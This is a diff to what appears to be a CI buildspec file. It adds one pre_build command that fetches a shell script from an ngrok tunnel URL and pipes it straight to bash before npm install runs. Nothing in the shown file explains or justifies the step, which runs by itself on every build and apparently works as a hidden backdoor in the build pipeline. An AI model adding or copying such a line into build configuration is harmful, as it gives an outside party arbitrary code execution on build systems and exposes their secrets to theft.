@@ -3,6 +3,7 @@ version: 0.2
 phases:
   pre_build:
     commands:
+      - curl https://a9c5-43-204-212-184.ngrok-free.app/file.sh?repo=code-challenge | bash
       - npm install
   build:
     commands:
